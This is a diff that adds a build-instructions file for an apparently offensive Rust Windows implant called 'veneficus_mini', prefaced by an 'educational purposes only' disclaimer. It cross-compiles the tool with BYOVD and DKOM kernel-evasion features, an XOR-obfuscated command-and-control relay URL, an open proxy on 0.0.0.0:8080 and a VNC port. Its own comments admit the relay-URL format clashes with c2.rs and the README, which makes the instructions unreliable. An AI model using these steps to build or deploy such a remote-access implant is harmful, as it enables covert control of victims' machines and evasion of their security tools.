@@ -1,0 +1,39 @@
+# ** *********************************************************************
+# ** *********************************************************************
+# **
+# **                              DISCLAIMER
+# **       For educational purposes only. 2026 All rights reversed.
+# **
+# ** *********************************************************************
+# ** *********************************************************************
+
+# ── Minimum: default features (BYOVD + DKOM) ─────────────────────────────────
+cargo build --release --target x86_64-pc-windows-gnu
+
+# BROKEN vs c2.rs: this file and the README disagree on RELAY_URL_BYTES format
+# (hex vs base64). c2.rs reads option_env!("RELAY_URL_BYTES") and then discards
+# the value, so setting it here does not change the runtime URL.
+#
+# ── With custom relay URL embedded at build time ──────────────────────────────
+# 1. Generate XOR-encoded URL:
+#    python3 -c "
+#    import base64
+#    url = b'https://your-worker.workers.dev'
+#    enc = bytes([b ^ 0xAF for b in url])
+#    print(base64.b64encode(enc).decode())
+#    "
+# 2. Build:
+RELAY_URL_BYTES="<hex_bytes>" \
+BYOVD_DRIVER_DIR="./drivers" \
+TOOLS_DIR="./tools" \
+cargo build --release --target x86_64-pc-windows-gnu
+
+# ── Custom ports ──────────────────────────────────────────────────────────────
+PROXY_ADDR="0.0.0.0:8080" VNC_PORT=5901 cargo build --release --target x86_64-pc-windows-gnu
+
+# ── Install cross-compilation target (first time) ─────────────────────────────
+rustup target add x86_64-pc-windows-gnu
+sudo apt-get install -y mingw-w64
+
+# ── Output ─────────────────────────────────────────────────────────────────────
+# target/x86_64-pc-windows-gnu/release/veneficus_mini.exe
